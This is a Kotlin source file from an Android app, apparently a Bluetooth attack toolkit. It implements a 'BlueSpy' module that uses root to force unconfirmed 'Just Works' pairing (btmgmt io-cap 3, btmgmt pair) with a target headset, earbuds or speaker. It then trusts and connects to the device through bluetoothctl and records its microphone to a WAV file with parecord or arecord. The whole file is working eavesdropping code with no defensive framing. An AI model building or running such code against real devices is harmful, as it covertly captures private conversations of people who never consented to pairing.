package com.hereliesaz.blusnu.data

import android.util.Log
import com.hereliesaz.blusnu.utils.MacValidator
import com.hereliesaz.blusnu.utils.RootExecutor
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow

/**
 * Implementation of the BlueSpy audio interception attack.
 *
 * This module targets Bluetooth audio devices (headsets, earbuds, speakers with
 * microphones) that use insecure "Just Works" pairing. The attack exploits the
 * lack of user confirmation in NoInputNoOutput IO capability pairing to silently
 * connect to a target device's audio profile and capture microphone audio.
 *
 * The attack flow:
 * 1. Validate the target MAC address.
 * 2. Verify root access (required for btmgmt and low-level Bluetooth operations).
 * 3. Check the target device for audio profile support (A2DP, HFP, HSP).
 * 4. Set the local IO capability to NoInputNoOutput to force Just Works pairing.
 * 5. Attempt silent pairing via btmgmt.
 * 6. Connect to the audio source profile using bluetoothctl / PulseAudio.
 * 7. Record microphone audio to a file on the device.
 *
 * Root is required for all operations (btmgmt access, pairing manipulation,
 * audio recording). All privileged operations are executed through [RootExecutor].
 */
class BlueSpyModule {

    companion object {
        private const val TAG = "BlueSpyModule"

        /** Directory where captured audio recordings are stored. */
        private const val RECORDING_DIR = "/sdcard/BluSnu/recordings"

        /**
         * btmgmt IO capability value for NoInputNoOutput.
         * Forces "Just Works" pairing with no user confirmation on either end.
         * See Bluetooth Core Specification Vol 3, Part H, Section 2.3.5.1.
         */
        private const val IO_CAP_NO_INPUT_NO_OUTPUT = 3

        /** Bluetooth profile UUIDs for audio services. */
        private const val A2DP_SINK_UUID = "0000110b"
        private const val HFP_HF_UUID = "0000111e"
        private const val HSP_HS_UUID = "00001108"
        private const val A2DP_SOURCE_UUID = "0000110a"
        private const val HFP_AG_UUID = "0000111f"
        private const val HSP_AG_UUID = "00001112"
    }

    /** Whether a recording is currently in progress. */
    @Volatile
    private var isRecording = false

    /** PID of the recording process, used for stopping. */
    @Volatile
    private var recordingPid: String? = null

    /**
     * Checks if the device has root access via [RootExecutor].
     *
     * @return true if a root shell reports uid=0.
     */
    suspend fun checkRoot(): Boolean {
        return RootExecutor.isRootAvailable()
    }

    /**
     * Stops the active audio recording, if one is in progress.
     *
     * Sends SIGTERM to the recording process and resets tracking state.
     */
    fun stopRecording() {
        val pid = recordingPid
        if (pid != null && isRecording) {
            try {
                // Use a non-suspend call; fire-and-forget is acceptable for kill
                Runtime.getRuntime().exec(arrayOf("su", "-c", "kill $pid"))
                Log.d(TAG, "Sent SIGTERM to recording process PID $pid")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to stop recording process: ${e.message}")
            }
        }
        isRecording = false
        recordingPid = null
    }

    /**
     * Executes the BlueSpy audio interception workflow against the target device.
     *
     * The flow:
     * 1. Validate MAC address.
     * 2. Verify root access (required, no simulation fallback).
     * 3. Check target for audio profile support (A2DP/HFP/HSP).
     * 4. Set IO capability to NoInputNoOutput to force Just Works pairing.
     * 5. Attempt silent pairing via btmgmt.
     * 6. Connect to audio source profile.
     * 7. Begin recording microphone audio to file.
     *
     * @param targetDevice The Bluetooth audio device to target.
     * @return A Flow of status strings for the UI console.
     */
    fun startAttack(targetDevice: TargetDevice): Flow<String> = flow {
        val mac = MacValidator.requireValid(targetDevice.macAddress)
        val displayName = targetDevice.name ?: mac
        emit("Starting BlueSpy Audio Interception on $displayName")

        // Step 1: Root is strictly required -- no simulation fallback
        if (!checkRoot()) {
            emit("ERROR: Root access is not available.")
            emit("BlueSpy requires root for btmgmt pairing manipulation and audio capture. Aborting.")
            return@flow
        }
        emit("Root access confirmed.")

        // Step 2: Check target device for audio profile support
        val hasAudio = checkAudioProfiles(mac)
        if (!hasAudio) {
            emit("WARNING: Could not confirm audio profile support on target.")
            emit("The device may not advertise A2DP/HFP/HSP or may be out of range.")
            emit("Continuing anyway -- the device may still accept audio connections.")
        }

        // Step 3: Set IO capability to NoInputNoOutput
        emit("Setting local IO capability to NoInputNoOutput (btmgmt io-cap $IO_CAP_NO_INPUT_NO_OUTPUT)...")
        val iocapResult = setIoCapability()
        if (!iocapResult) {
            emit("ERROR: Failed to set IO capability. btmgmt may not be available.")
            emit("Aborting -- cannot force Just Works pairing without IO capability control.")
            return@flow
        }
        emit("IO capability set to NoInputNoOutput. Just Works pairing will be forced.")

        // Step 4: Attempt silent pairing
        emit("Attempting silent pairing with $displayName ($mac)...")
        val pairingSuccess = attemptSilentPairing(mac)
        if (!pairingSuccess) {
            emit("ERROR: Silent pairing failed.")
            emit("The target may require user confirmation, be out of range, or already be paired.")
            emit("If already paired to another device, the attack may still proceed via profile connection.")
        } else {
            emit("Silent pairing successful. Device paired without user interaction.")
        }

        // Step 5: Connect to audio profile
        emit("Connecting to audio source profile on $displayName...")
        val connectSuccess = connectAudioProfile(mac)
        if (!connectSuccess) {
            emit("ERROR: Failed to connect to audio profile.")
            emit("The device may not have an accessible microphone or may have rejected the connection.")
            return@flow
        }
        emit("Audio profile connected successfully.")

        // Step 6: Load PulseAudio Bluetooth module (if not already loaded)
        emit("Ensuring PulseAudio Bluetooth discovery module is loaded...")
        loadPulseAudioModule()

        // Step 7: Start recording
        emit("Preparing recording directory at $RECORDING_DIR...")
        ensureRecordingDirectory()

        val timestamp = System.currentTimeMillis()
        val sanitizedMac = mac.replace(":", "")
        val outputFile = "$RECORDING_DIR/bluespy_${sanitizedMac}_$timestamp.wav"

        emit("Starting audio capture to $outputFile...")
        val recordResult = startRecordingProcess(mac, outputFile)
        if (recordResult) {
            emit("RECORDING IN PROGRESS")
            emit("Audio is being captured from $displayName")
            emit("Output file: $outputFile")
            emit("Use the STOP button to end the recording.")
        } else {
            emit("ERROR: Failed to start audio recording.")
            emit("parecord/arecord may not be available or the audio source is inaccessible.")
        }
    }

    /**
     * Queries the target device for audio profile support using hcitool info.
     * Looks for A2DP, HFP, and HSP UUIDs in the service discovery results.
     *
     * @return true if at least one audio profile UUID was found.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.checkAudioProfiles(
        mac: String
    ): Boolean {
        emit("Querying $mac for audio profiles (A2DP/HFP/HSP)...")
        val infoResult = RootExecutor.execute("hcitool info $mac")

        if (infoResult.startsWith("Error") || infoResult.isBlank()) {
            emit("Could not retrieve device info: ${infoResult.ifBlank { "(no output)" }}")
            return false
        }

        // Emit relevant lines from the info output
        for (line in infoResult.lines()) {
            if (line.isNotBlank()) {
                emit("  $line")
            }
        }

        val lowerInfo = infoResult.lowercase()
        val audioUuids = listOf(
            A2DP_SINK_UUID, A2DP_SOURCE_UUID,
            HFP_HF_UUID, HFP_AG_UUID,
            HSP_HS_UUID, HSP_AG_UUID
        )
        val foundProfiles = audioUuids.filter { lowerInfo.contains(it) }

        if (foundProfiles.isNotEmpty()) {
            emit("Audio profiles detected: ${describeProfiles(foundProfiles)}")
            return true
        }

        // Also check via sdptool as a fallback
        emit("No audio UUIDs in hcitool info. Trying sdptool browse...")
        val sdpResult = RootExecutor.execute("sdptool browse $mac")
        val lowerSdp = sdpResult.lowercase()
        val sdpProfiles = audioUuids.filter { lowerSdp.contains(it) }

        if (sdpProfiles.isNotEmpty()) {
            emit("Audio profiles found via SDP: ${describeProfiles(sdpProfiles)}")
            return true
        }

        emit("No audio profiles detected on target.")
        return false
    }

    /**
     * Maps audio profile UUIDs to human-readable names.
     */
    private fun describeProfiles(uuids: List<String>): String {
        return uuids.mapNotNull { uuid ->
            when (uuid) {
                A2DP_SINK_UUID -> "A2DP Sink"
                A2DP_SOURCE_UUID -> "A2DP Source"
                HFP_HF_UUID -> "HFP Hands-Free"
                HFP_AG_UUID -> "HFP Audio Gateway"
                HSP_HS_UUID -> "HSP Headset"
                HSP_AG_UUID -> "HSP Audio Gateway"
                else -> null
            }
        }.joinToString(", ")
    }

    /**
     * Sets the local Bluetooth adapter's IO capability to NoInputNoOutput
     * using btmgmt. This forces "Just Works" pairing with no user confirmation.
     *
     * @return true if the command executed without error.
     */
    private suspend fun setIoCapability(): Boolean {
        val result = RootExecutor.execute("btmgmt io-cap $IO_CAP_NO_INPUT_NO_OUTPUT")
        Log.d(TAG, "btmgmt io-cap result: $result")
        return !result.startsWith("Error") && !result.contains("not found")
    }

    /**
     * Attempts to pair with the target device silently via btmgmt pair.
     * With IO capability set to NoInputNoOutput, this should complete
     * without any user interaction on either device.
     *
     * @return true if pairing completed without error.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.attemptSilentPairing(
        mac: String
    ): Boolean {
        val result = RootExecutor.execute("btmgmt pair -c $IO_CAP_NO_INPUT_NO_OUTPUT -t 0 $mac")

        for (line in result.lines()) {
            if (line.isNotBlank()) {
                emit("  $line")
            }
        }

        if (result.startsWith("Error")) {
            Log.w(TAG, "btmgmt pair failed: $result")
            return false
        }

        // Check if "paired" or "already paired" appears in output
        val lowerResult = result.lowercase()
        return lowerResult.contains("paired") || lowerResult.contains("success") ||
                (!lowerResult.contains("failed") && !lowerResult.contains("error"))
    }

    /**
     * Connects to the target device's audio profile using bluetoothctl.
     * Tries to connect to the device which will automatically engage
     * available audio profiles.
     *
     * @return true if the connection was established.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.connectAudioProfile(
        mac: String
    ): Boolean {
        // Trust the device first to allow automatic profile connections
        emit("  Trusting device $mac...")
        val trustResult = RootExecutor.execute("bluetoothctl trust $mac")
        emit("  Trust result: ${trustResult.ifBlank { "OK" }}")

        // Connect to the device
        emit("  Connecting to $mac...")
        val connectResult = RootExecutor.execute("bluetoothctl connect $mac")

        for (line in connectResult.lines()) {
            if (line.isNotBlank()) {
                emit("  $line")
            }
        }

        if (connectResult.startsWith("Error")) {
            Log.w(TAG, "bluetoothctl connect failed: $connectResult")
            return false
        }

        val lowerResult = connectResult.lowercase()
        return lowerResult.contains("connection successful") ||
                lowerResult.contains("connected") ||
                (!lowerResult.contains("failed") && !lowerResult.contains("error"))
    }

    /**
     * Loads the PulseAudio Bluetooth discovery module to make Bluetooth
     * audio sources available for recording.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.loadPulseAudioModule() {
        val result = RootExecutor.execute(
            "pactl load-module module-bluetooth-discover 2>/dev/null; echo done"
        )
        if (result.contains("error", ignoreCase = true) &&
            !result.contains("already loaded", ignoreCase = true)
        ) {
            emit("WARNING: PulseAudio Bluetooth module may not have loaded: $result")
            emit("Falling back to direct ALSA recording if PulseAudio is unavailable.")
        } else {
            emit("PulseAudio Bluetooth discovery module active.")
        }
    }

    /**
     * Creates the recording output directory if it does not exist.
     */
    private suspend fun ensureRecordingDirectory() {
        RootExecutor.execute("mkdir -p $RECORDING_DIR")
    }

    /**
     * Starts the audio recording process, attempting parecord first and
     * falling back to arecord if PulseAudio is not available.
     *
     * The recording process is started in the background and its PID is
     * tracked for later termination via [stopRecording].
     *
     * @param mac The target device MAC address (used to identify the audio source).
     * @param outputFile The full path to write the recorded audio file.
     * @return true if the recording process was started successfully.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.startRecordingProcess(
        mac: String,
        outputFile: String
    ): Boolean {
        isRecording = true

        // Try parecord (PulseAudio) first
        emit("Attempting recording via parecord...")
        val parecordResult = RootExecutor.execute(
            "nohup parecord --file-format=wav \"$outputFile\" > /dev/null 2>&1 & echo \$!"
        )

        val parecordPid = parecordResult.trim().lines().lastOrNull()?.trim()
        if (parecordPid != null && parecordPid.all { it.isDigit() } && parecordPid.isNotEmpty()) {
            recordingPid = parecordPid
            emit("parecord started with PID $parecordPid")
            Log.d(TAG, "Recording started via parecord, PID=$parecordPid, file=$outputFile")
            return true
        }

        // Fallback: try arecord (ALSA)
        emit("parecord not available. Falling back to arecord...")
        val arecordResult = RootExecutor.execute(
            "nohup arecord -f S16_LE -r 16000 -c 1 \"$outputFile\" > /dev/null 2>&1 & echo \$!"
        )

        val arecordPid = arecordResult.trim().lines().lastOrNull()?.trim()
        if (arecordPid != null && arecordPid.all { it.isDigit() } && arecordPid.isNotEmpty()) {
            recordingPid = arecordPid
            emit("arecord started with PID $arecordPid")
            Log.d(TAG, "Recording started via arecord, PID=$arecordPid, file=$outputFile")
            return true
        }

        emit("Neither parecord nor arecord could be started.")
        isRecording = false
        return false
    }
}
